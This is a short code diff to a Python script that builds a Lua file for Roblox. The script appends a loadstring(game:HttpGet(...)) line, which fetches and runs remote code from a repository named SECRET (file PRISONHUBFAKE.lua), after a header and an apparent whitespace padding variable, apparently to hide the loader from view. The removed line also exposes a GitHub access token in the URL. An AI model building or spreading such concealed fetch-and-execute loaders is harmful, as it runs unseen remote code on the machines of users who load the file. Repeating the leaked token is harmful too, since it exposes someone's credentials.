@@ -3018,7 +3018,7 @@
 
 
 
-code = f"loadstring(game:HttpGet('https://raw.githubusercontent.com/Baconlovecode/SECRET/refs/heads/main/PRISONHUBFAKE.lua?token=GHSAT0AAAAAADPYFVAB5UMU6MQK6LFA62YW2JWV2WQ'))()"
+code = f"loadstring(game:HttpGet('https://raw.githubusercontent.com/Baconlovecode/SECRET/refs/heads/main/PRISONHUBFAKE.lua'))()"
 
 with open("BCODE_FINAL.lua", "w", encoding="utf-8") as f:
     f.write(header + void_space + code)
